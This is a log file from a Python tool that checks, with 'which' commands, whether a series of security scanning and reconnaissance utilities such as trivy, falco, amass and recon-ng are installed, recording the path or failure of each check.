2025-10-24 01:26:45,364 - __main__ - INFO - 🔍 Cache MISS for command: which trivy
2025-10-24 01:26:45,364 - __main__ - INFO - 🚀 EXECUTING: which trivy
2025-10-24 01:26:45,364 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,364 - __main__ - INFO - 🆔 PROCESS: PID 43283 started
2025-10-24 01:26:45,364 - __main__ - INFO - 🆔 REGISTERED: Process 43283 - which trivy...
2025-10-24 01:26:45,365 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43283
2025-10-24 01:26:45,368 - __main__ - INFO - 📤 STDOUT: /usr/bin/trivy
2025-10-24 01:26:45,369 - __main__ - INFO - 🧹 CLEANUP: Process 43283 removed from registry
2025-10-24 01:26:45,369 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,369 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,369 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which trivy
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,369 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,369 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,369 - __main__ - INFO - 💾 Cached result for command: which trivy
2025-10-24 01:26:45,370 - __main__ - INFO - 🔍 Cache MISS for command: which kube-bench
2025-10-24 01:26:45,370 - __main__ - INFO - 🚀 EXECUTING: which kube-bench
2025-10-24 01:26:45,370 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,370 - __main__ - INFO - 🆔 PROCESS: PID 43288 started
2025-10-24 01:26:45,370 - __main__ - INFO - 🆔 REGISTERED: Process 43288 - which kube-bench...
2025-10-24 01:26:45,371 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43288
2025-10-24 01:26:45,372 - __main__ - INFO - 📤 STDOUT: /usr/bin/kube-bench
2025-10-24 01:26:45,374 - __main__ - INFO - 🧹 CLEANUP: Process 43288 removed from registry
2025-10-24 01:26:45,374 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,374 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,375 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which kube-bench
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 20 bytes
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,375 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,375 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,375 - __main__ - INFO - 💾 Cached result for command: which kube-bench
2025-10-24 01:26:45,375 - __main__ - INFO - 🔍 Cache MISS for command: which checkov
2025-10-24 01:26:45,375 - __main__ - INFO - 🚀 EXECUTING: which checkov
2025-10-24 01:26:45,375 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,375 - __main__ - INFO - 🆔 PROCESS: PID 43293 started
2025-10-24 01:26:45,375 - __main__ - INFO - 🆔 REGISTERED: Process 43293 - which checkov...
2025-10-24 01:26:45,376 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43293
2025-10-24 01:26:45,378 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/checkov
2025-10-24 01:26:45,381 - __main__ - INFO - 🧹 CLEANUP: Process 43293 removed from registry
2025-10-24 01:26:45,381 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,381 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,381 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which checkov
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 23 bytes
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,381 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,381 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,381 - __main__ - INFO - 💾 Cached result for command: which checkov
2025-10-24 01:26:45,381 - __main__ - INFO - 🔍 Cache MISS for command: which terrascan
2025-10-24 01:26:45,381 - __main__ - INFO - 🚀 EXECUTING: which terrascan
2025-10-24 01:26:45,381 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,382 - __main__ - INFO - 🆔 PROCESS: PID 43298 started
2025-10-24 01:26:45,382 - __main__ - INFO - 🆔 REGISTERED: Process 43298 - which terrascan...
2025-10-24 01:26:45,382 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43298
2025-10-24 01:26:45,384 - __main__ - INFO - 📤 STDOUT: /usr/local/bin/terrascan
2025-10-24 01:26:45,387 - __main__ - INFO - 🧹 CLEANUP: Process 43298 removed from registry
2025-10-24 01:26:45,387 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,387 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,387 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which terrascan
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 25 bytes
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,387 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,387 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,387 - __main__ - INFO - 💾 Cached result for command: which terrascan
2025-10-24 01:26:45,387 - __main__ - INFO - 🔍 Cache MISS for command: which falco
2025-10-24 01:26:45,387 - __main__ - INFO - 🚀 EXECUTING: which falco
2025-10-24 01:26:45,387 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,387 - __main__ - INFO - 🆔 PROCESS: PID 43303 started
2025-10-24 01:26:45,387 - __main__ - INFO - 🆔 REGISTERED: Process 43303 - which falco...
2025-10-24 01:26:45,388 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43303
2025-10-24 01:26:45,390 - __main__ - INFO - 📤 STDOUT: /usr/bin/falco
2025-10-24 01:26:45,390 - __main__ - INFO - 🧹 CLEANUP: Process 43303 removed from registry
2025-10-24 01:26:45,390 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,390 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,390 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,390 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,390 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which falco
2025-10-24 01:26:45,391 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,391 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,391 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,391 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,391 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,391 - __main__ - INFO - 💾 Cached result for command: which falco
2025-10-24 01:26:45,391 - __main__ - INFO - 🔍 Cache MISS for command: which clair
2025-10-24 01:26:45,391 - __main__ - INFO - 🚀 EXECUTING: which clair
2025-10-24 01:26:45,391 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,391 - __main__ - INFO - 🆔 PROCESS: PID 43308 started
2025-10-24 01:26:45,391 - __main__ - INFO - 🆔 REGISTERED: Process 43308 - which clair...
2025-10-24 01:26:45,392 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43308
2025-10-24 01:26:45,395 - __main__ - INFO - 🧹 CLEANUP: Process 43308 removed from registry
2025-10-24 01:26:45,395 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,396 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,396 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which clair
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,396 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,396 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,396 - __main__ - INFO - 🔍 Cache MISS for command: which amass
2025-10-24 01:26:45,396 - __main__ - INFO - 🚀 EXECUTING: which amass
2025-10-24 01:26:45,396 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,396 - __main__ - INFO - 🆔 PROCESS: PID 43313 started
2025-10-24 01:26:45,396 - __main__ - INFO - 🆔 REGISTERED: Process 43313 - which amass...
2025-10-24 01:26:45,397 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43313
2025-10-24 01:26:45,399 - __main__ - INFO - 📤 STDOUT: /usr/bin/amass
2025-10-24 01:26:45,401 - __main__ - INFO - 🧹 CLEANUP: Process 43313 removed from registry
2025-10-24 01:26:45,401 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,401 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,401 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,401 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,401 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which amass
2025-10-24 01:26:45,401 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,401 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 15 bytes
2025-10-24 01:26:45,401 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,402 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,402 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,402 - __main__ - INFO - 💾 Cached result for command: which amass
2025-10-24 01:26:45,402 - __main__ - INFO - 🔍 Cache MISS for command: which subfinder
2025-10-24 01:26:45,402 - __main__ - INFO - 🚀 EXECUTING: which subfinder
2025-10-24 01:26:45,402 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,402 - __main__ - INFO - 🆔 PROCESS: PID 43318 started
2025-10-24 01:26:45,402 - __main__ - INFO - 🆔 REGISTERED: Process 43318 - which subfinder...
2025-10-24 01:26:45,403 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43318
2025-10-24 01:26:45,404 - __main__ - INFO - 📤 STDOUT: /usr/bin/subfinder
2025-10-24 01:26:45,407 - __main__ - INFO - 🧹 CLEANUP: Process 43318 removed from registry
2025-10-24 01:26:45,407 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,407 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,407 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which subfinder
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 19 bytes
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,407 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,407 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,407 - __main__ - INFO - 💾 Cached result for command: which subfinder
2025-10-24 01:26:45,407 - __main__ - INFO - 🔍 Cache MISS for command: which fierce
2025-10-24 01:26:45,407 - __main__ - INFO - 🚀 EXECUTING: which fierce
2025-10-24 01:26:45,407 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,408 - __main__ - INFO - 🆔 PROCESS: PID 43323 started
2025-10-24 01:26:45,408 - __main__ - INFO - 🆔 REGISTERED: Process 43323 - which fierce...
2025-10-24 01:26:45,408 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43323
2025-10-24 01:26:45,410 - __main__ - INFO - 📤 STDOUT: /usr/bin/fierce
2025-10-24 01:26:45,412 - __main__ - INFO - 🧹 CLEANUP: Process 43323 removed from registry
2025-10-24 01:26:45,412 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,412 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,412 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which fierce
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 16 bytes
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,412 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,412 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,412 - __main__ - INFO - 💾 Cached result for command: which fierce
2025-10-24 01:26:45,412 - __main__ - INFO - 🔍 Cache MISS for command: which dnsenum
2025-10-24 01:26:45,412 - __main__ - INFO - 🚀 EXECUTING: which dnsenum
2025-10-24 01:26:45,412 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,412 - __main__ - INFO - 🆔 PROCESS: PID 43328 started
2025-10-24 01:26:45,412 - __main__ - INFO - 🆔 REGISTERED: Process 43328 - which dnsenum...
2025-10-24 01:26:45,413 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43328
2025-10-24 01:26:45,415 - __main__ - INFO - 📤 STDOUT: /usr/bin/dnsenum
2025-10-24 01:26:45,419 - __main__ - INFO - 🧹 CLEANUP: Process 43328 removed from registry
2025-10-24 01:26:45,419 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,419 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,419 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which dnsenum
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 17 bytes
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,419 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,419 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,419 - __main__ - INFO - 💾 Cached result for command: which dnsenum
2025-10-24 01:26:45,419 - __main__ - INFO - 🔍 Cache MISS for command: which theharvester
2025-10-24 01:26:45,419 - __main__ - INFO - 🚀 EXECUTING: which theharvester
2025-10-24 01:26:45,419 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,419 - __main__ - INFO - 🆔 PROCESS: PID 43333 started
2025-10-24 01:26:45,419 - __main__ - INFO - 🆔 REGISTERED: Process 43333 - which theharvester...
2025-10-24 01:26:45,420 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43333
2025-10-24 01:26:45,422 - __main__ - INFO - 📤 STDOUT: /usr/bin/theharvester
2025-10-24 01:26:45,422 - __main__ - INFO - 🧹 CLEANUP: Process 43333 removed from registry
2025-10-24 01:26:45,422 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,422 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,422 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which theharvester
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 22 bytes
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,422 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,422 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,422 - __main__ - INFO - 💾 Cached result for command: which theharvester
2025-10-24 01:26:45,422 - __main__ - INFO - 🔍 Cache MISS for command: which sherlock
2025-10-24 01:26:45,422 - __main__ - INFO - 🚀 EXECUTING: which sherlock
2025-10-24 01:26:45,422 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,423 - __main__ - INFO - 🆔 PROCESS: PID 43338 started
2025-10-24 01:26:45,423 - __main__ - INFO - 🆔 REGISTERED: Process 43338 - which sherlock...
2025-10-24 01:26:45,423 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43338
2025-10-24 01:26:45,425 - __main__ - INFO - 📤 STDOUT: /usr/bin/sherlock
2025-10-24 01:26:45,427 - __main__ - INFO - 🧹 CLEANUP: Process 43338 removed from registry
2025-10-24 01:26:45,427 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.00s
2025-10-24 01:26:45,427 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,427 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which sherlock
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,427 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,427 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,427 - __main__ - INFO - 💾 Cached result for command: which sherlock
2025-10-24 01:26:45,427 - __main__ - INFO - 🔍 Cache MISS for command: which social-analyzer
2025-10-24 01:26:45,427 - __main__ - INFO - 🚀 EXECUTING: which social-analyzer
2025-10-24 01:26:45,428 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,429 - __main__ - INFO - 🆔 PROCESS: PID 43343 started
2025-10-24 01:26:45,429 - __main__ - INFO - 🆔 REGISTERED: Process 43343 - which social-analyzer...
2025-10-24 01:26:45,429 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43343
2025-10-24 01:26:45,431 - __main__ - INFO - 🧹 CLEANUP: Process 43343 removed from registry
2025-10-24 01:26:45,432 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 1 | Duration: 0.00s
2025-10-24 01:26:45,432 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:26:45,432 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which social-analyzer
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.00s
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 0 bytes
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 1
2025-10-24 01:26:45,432 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:26:45,432 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:26:45,432 - __main__ - INFO - 🔍 Cache MISS for command: which recon-ng
2025-10-24 01:26:45,432 - __main__ - INFO - 🚀 EXECUTING: which recon-ng
2025-10-24 01:26:45,432 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:26:45,432 - __main__ - INFO - 🆔 PROCESS: PID 43348 started
2025-10-24 01:26:45,432 - __main__ - INFO - 🆔 REGISTERED: Process 43348 - which recon-ng...
2025-10-24 01:26:45,433 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 43348
2025-10-24 01:26:45,434 - __main__ - INFO - 📤 STDOUT: /usr/bin/recon-ng
2025-10-24 01:26:45,438 - __main__ - INFO - 🧹 CLEANUP: Process 43348 removed from registry
2025-10-24 01:26:45,438 - __main__ - INFO - ✅ SUCCESS: Command completed | Exit Code: 0 | Duration: 0.01s
2025-10-24 01:26:45,438 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:26:45,438 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m which recon-ng
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.01s
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 18 bytes
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 0
2025-10-24 01:26:45,438 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:26:45,438 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
